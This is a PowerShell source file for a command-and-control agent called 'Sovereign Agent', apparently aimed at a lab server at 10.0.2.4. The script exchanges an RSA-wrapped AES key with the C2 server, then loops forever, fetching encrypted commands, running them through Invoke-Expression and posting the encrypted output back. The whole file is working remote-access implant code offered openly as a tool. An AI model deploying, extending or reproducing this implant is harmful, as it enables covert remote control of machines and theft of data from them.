########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################

# PowerShell script for Sovereign Agent

$ErrorActionPreference = "Stop"

# Function to load or generate AgentID
Function Load-AgentID {
    Param (
        [string]$FilePath
    )
    If (Test-Path $FilePath) {
        $AgentID = (Get-Content $FilePath -Raw).Trim()
        Write-Host "[*] Loaded AgentID: $AgentID"
        return $AgentID
    } Else {
        $AgentID = [guid]::NewGuid().ToString()
        Set-Content -Path $FilePath -Value $AgentID
        Write-Host "[*] Generated and saved new AgentID: $AgentID"
        return $AgentID
    }
}

# Function to send heartbeat to C2 server
Function Send-Heartbeat {
    Param (
        [string]$AgentID,
        [string]$C2Url,
        [byte[]]$AESKey
    )

    Try {
        $Body = @{
            AgentID = $AgentID
        } | ConvertTo-Json -Compress

        Write-Host "[*] Sending heartbeat to C2 server..."
        $Response = Invoke-RestMethod -Uri "$C2Url/heartbeat" -Method POST -Body $Body -ContentType "application/json"

        $EncryptedCommand = $Response.data
        $AES = New-Object System.Security.Cryptography.AesManaged
        $AES.Key = $AESKey
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $CommandBytes = [Convert]::FromBase64String($EncryptedCommand)
        $IV = $CommandBytes[0..15]
        $CipherText = $CommandBytes[16..($CommandBytes.Length - 1)]
        $Decryptor = $AES.CreateDecryptor($AES.Key, $IV)
        $Command = [System.Text.Encoding]::UTF8.GetString($Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length))

        If ($Command -ne "NoCommand") {
            Write-Host "[*] Received command: $Command"
            # Execute the command and send the result back to the server
            $Result = Invoke-Expression $Command
            Send-Result -AgentID $AgentID -C2Url $C2Url -Result $Result -AESKey $AESKey
        } Else {
            Write-Host "[*] No command received."
        }
    } Catch {
        Write-Host "[!] ERROR: $_"
        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    }
}

# Function to send the result back to the C2 server
Function Send-Result {
    Param (
        [string]$AgentID,
        [string]$C2Url,
        [string]$Result,
        [byte[]]$AESKey
    )

    Try {
        $AES = New-Object System.Security.Cryptography.AesManaged
        $AES.Key = $AESKey
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $Encryptor = $AES.CreateEncryptor()
        $ResultBytes = [System.Text.Encoding]::UTF8.GetBytes($Result)
        $CipherText = $Encryptor.TransformFinalBlock($ResultBytes, 0, $ResultBytes.Length)
        $IV = $AES.IV
        $EncryptedResult = [Convert]::ToBase64String($IV + $CipherText)

        $Body = @{
            AgentID = $AgentID
            Result  = $EncryptedResult
        } | ConvertTo-Json -Compress

        Write-Host "[*] Sending result to C2 server..."
        Invoke-RestMethod -Uri "$C2Url/result" -Method POST -Body $Body -ContentType "application/json"
        Write-Host "[+] Result sent successfully."
    } Catch {
        Write-Host "[!] ERROR: $_"
        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    }
}

# Main script execution block
Try {
    $AgentIDFilePath = "C:\Temp\agent_id.txt"
    $AgentID = Load-AgentID -FilePath $AgentIDFilePath
    $C2Url = "http://10.0.2.4:8000"

    Write-Host "[*] Fetching Public Key from C2 Server..."
    $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
    
    If (-Not $PublicKeyResponse.PublicKey) {
        Throw "[-] Failed to retrieve public key"
    }

    # Use XML format instead of PEM
    $PublicKeyXML = $PublicKeyResponse.PublicKey
    Write-Host "[+] Public Key retrieved successfully."

    # Convert XML Key to RSACryptoServiceProvider
    Function Import-RSAKey ($PublicKeyXML) {
        $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
        $rsa.FromXmlString($PublicKeyXML)
        return $rsa
    }

    $RSA = Import-RSAKey $PublicKeyXML

    # Generate AES Key (256-bit)
    $AESKey = New-Object byte[] 32
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
    $AESKeyBase64 = [Convert]::ToBase64String($AESKey)
    Write-Host "[*] Generated AES Key (Base64): $AESKeyBase64"

    # Encrypt AES Key with RSA
    Write-Host "[*] Encrypting AES Key with RSA..."
    $EncryptedAESKey = $RSA.Encrypt($AESKey, $true)
    $EncryptedAESKeyBase64 = [Convert]::ToBase64String($EncryptedAESKey)
    Write-Host "[+] AES Key encrypted successfully."

    # Send Encrypted AES Key to C2 Server
    $Body = @{
        AgentID   = $AgentID
        EncAESKey = $EncryptedAESKeyBase64
    } | ConvertTo-Json -Compress

    Write-Host "[*] Sending encrypted AES key to C2 server..."
    $Response = Invoke-RestMethod -Uri "$C2Url/exchange_key" -Method POST -Body $Body -ContentType "application/json"
    
    If ($Response.Status -ne "Success") {
        Throw "[-] Key exchange failed: $($Response | ConvertTo-Json -Depth 10)"
    }

    Write-Host "[+] Key exchange successful."

    # Start sending heartbeats to keep the connection alive
    While ($true) {
        Try {
            Send-Heartbeat -AgentID $AgentID -C2Url $C2Url -AESKey $AESKey
        } Catch {
            Write-Host "[!] ERROR during heartbeat: $_"
            $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
        }
        Start-Sleep -Seconds 10  # Adjust the interval as needed
    }
}
Catch {
    Write-Host "[!] ERROR: $_"
    $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    Start-Sleep -Seconds 10  # Keep window open for debugging
}
